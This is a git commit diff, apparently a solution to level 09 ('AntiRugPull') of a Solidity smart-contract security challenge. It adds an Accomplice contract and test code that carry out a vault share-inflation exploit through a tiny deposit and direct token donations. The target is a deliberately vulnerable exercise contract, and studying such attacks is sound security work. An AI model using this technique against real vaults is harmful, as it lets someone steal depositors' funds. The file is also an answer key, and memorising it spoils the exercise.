35ef14c25ab6933c264142e2a7bc0993474eff02
Vyacheslav Ryzhkov <rugrisser@gmail.com>
2024-11-24 20:48:30 +0300

    Task 09 solved

--- test/09_AntiRugPull.t.sol
+++ test/09_AntiRugPull.t.sol
@@ -5,6 +5,22 @@ import "./BaseTest.t.sol";
 import "../src/09_AntiRugPull/AntiRugPull.sol";
 import "../src/09_AntiRugPull/MintableERC20.sol";
 
+contract Accomplice {
+    
+    Vault instance;
+    MintableERC20 token;
+
+    constructor(Vault _instance, MintableERC20 _token) {
+        instance = _instance;
+        token = _token;
+    }
+
+    function addShare() external {
+        token.approve(address(instance), 1);
+        instance.deposit(1);
+    }
+}
+
 // forge test --match-contract AntiRugPullTest
 contract AntiRugPullTest is BaseTest {
     Vault instance;
@@ -20,13 +36,16 @@ contract AntiRugPullTest is BaseTest {
     }
 
     function testExploitLevel() public {
-        /* YOUR EXPLOIT GOES HERE */
+        Accomplice accomplice = new Accomplice(instance, token);
+
+        token.transfer(address(accomplice), 0.1 ether);
+        token.transfer(address(instance), 0.8 ether);
+        accomplice.addShare();
 
         checkSuccess();
     }
 
     function checkSuccess() internal override {
-        vm.startPrank(address(this));
         token.approve(address(instance), 10 ** 17);
         instance.deposit(10 ** 17);
 
